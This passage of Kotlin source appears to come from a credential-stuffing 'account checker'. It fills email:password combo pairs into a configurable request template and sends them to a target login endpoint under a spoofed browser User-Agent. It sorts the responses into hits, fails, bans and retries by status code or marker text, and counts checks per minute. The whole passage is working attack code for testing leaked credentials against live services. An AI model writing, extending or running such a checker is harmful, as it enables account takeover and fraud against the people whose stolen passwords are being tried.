                val status = when (response.code) {
                    200 -> AccountStatus.HIT
                    401 -> AccountStatus.FAIL
                    429 -> AccountStatus.BAN
                    else -> AccountStatus.ERROR
                }
                cont.resume(createResult(combo, status, "HTTP ${response.code}"))
            }
        })
    }

    private suspend fun checkCustom(combo: Combo): Account = suspendCoroutine { cont ->
        val url = config.customUrl.ifBlank { CheckModule.CUSTOM.endpoint }
        if (url.isEmpty()) {
            cont.resume(createResult(combo, AccountStatus.ERROR, "Custom module needs a URL"))
            return@suspendCoroutine
        }
        try {
            val method = config.customMethod.uppercase()
            val content = config.customBodyTemplate
                .replace("{email}", combo.email)
                .replace("{password}", combo.password)

            val builder = Request.Builder()
                .url(url)
                .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

            when (method) {
                "GET" -> builder.get()
                "PUT" -> builder.put(
                    content.toRequestBody(config.customContentType.ifBlank { "application/json" }.toMediaType())
                )
                "PATCH" -> builder.patch(
                    content.toRequestBody(config.customContentType.ifBlank { "application/json" }.toMediaType())
                )
                "DELETE" -> builder.delete(
                    content.toRequestBody(config.customContentType.ifBlank { "application/json" }.toMediaType())
                )
                else -> builder.post(
                    content.toRequestBody(config.customContentType.ifBlank { "application/json" }.toMediaType())
                )
            }

            getOkHttpClient().newCall(builder.build()).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) {
                    cont.resume(createResult(combo, AccountStatus.ERROR, e.message ?: "Connection failed"))
                }

                override fun onResponse(call: Call, response: Response) {
                    val bodyStr = response.body?.string() ?: ""
                    response.close()

                    val hasSuccess = config.customSuccessMarker.isNotBlank() && bodyStr.contains(config.customSuccessMarker)
                    val hasFail = config.customFailMarker.isNotBlank() && bodyStr.contains(config.customFailMarker)
                    val markersConfigured = config.customSuccessMarker.isNotBlank() || config.customFailMarker.isNotBlank()

                    val status = when {
                        hasSuccess -> AccountStatus.HIT
                        hasFail -> AccountStatus.FAIL
                        markersConfigured -> AccountStatus.FAIL
                        response.code == 200 || response.code == 201 || response.code == 204 -> AccountStatus.HIT
                        response.code == 401 || response.code == 403 -> AccountStatus.FAIL
                        response.code == 429 -> AccountStatus.BAN
                        response.code == 500 || response.code == 502 || response.code == 503 -> AccountStatus.RETRY
                        else -> AccountStatus.ERROR
                    }

                    val details = when (status) {
                        AccountStatus.HIT -> if (config.customSuccessMarker.isNotBlank()) {
                            "Marker: ${config.customSuccessMarker}"
                        } else {
                            "HTTP ${response.code}"
                        }
                        AccountStatus.FAIL -> if (config.customFailMarker.isNotBlank()) {
                            "Marker: ${config.customFailMarker}"
                        } else {
                            "HTTP ${response.code}"
                        }
                        else -> "HTTP ${response.code}"
                    }

                    cont.resume(createResult(combo, status, details))
                }
            })
        } catch (e: Exception) {
            cont.resume(createResult(combo, AccountStatus.ERROR, "Bad config: ${e.message}"))
        }
    }

    private fun createResult(combo: Combo, status: AccountStatus, details: String): Account {
        return Account(
            email = combo.email,
            password = combo.password,
            status = status,
            details = details
        )
    }

    private fun updateStats(result: Account) {
        when (result.status) {
            AccountStatus.HIT -> stats.hits++
            AccountStatus.FAIL -> stats.fails++
            AccountStatus.BAN -> stats.banned++
            AccountStatus.CAPTCHA -> stats.captcha++
            AccountStatus.RETRY -> stats.retries++
            AccountStatus.ERROR -> stats.errors++
            else -> {}
        }
        stats.cpm = stats.computeCpm()
        onStatsUpdate?.invoke(stats)
    }
}
